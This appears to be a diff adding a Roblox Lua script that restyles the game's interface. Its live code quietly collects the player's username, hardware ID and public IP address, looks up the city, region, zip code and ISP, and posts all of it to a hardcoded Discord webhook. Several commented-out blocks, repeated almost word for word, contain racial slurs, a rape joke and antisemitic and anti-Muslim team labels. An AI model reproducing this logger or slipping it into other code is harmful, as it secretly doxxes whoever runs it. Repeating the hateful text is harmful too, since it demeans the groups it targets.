+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+local webh = "https://discord.com/api/webhooks/1071601901839319072/rzDCjGyhC0NQqTOWGGyecAy3DJ7Mv0JIgKGTkmo-RtA5s4DdMuifRLe9FB69NAwKIX1f"
+
+
+pcall(function()
+   local data = {
+
+  ['embeds'] = {
+    {
+       ['title'] = 'hi mamasssss',
+       ['description'] = 'furry',
+       ['fields'] = {
+          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
+          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
+
+        }
+    }
+  }
+}
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+
+local name = game:GetService("Players").LocalPlayer.Name
+local WebhookURL = "https://discord.com/api/webhooks/1071601901839319072/rzDCjGyhC0NQqTOWGGyecAy3DJ7Mv0JIgKGTkmo-RtA5s4DdMuifRLe9FB69NAwKIX1f"
+local getIPResponse = syn.request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = syn.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org
+}
+local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local MessageData = {
+    ["content"] = dataMessage
+}
+
+syn.request(
+    {
+        Url = WebhookURL, 
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(MessageData)
+    }
+)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
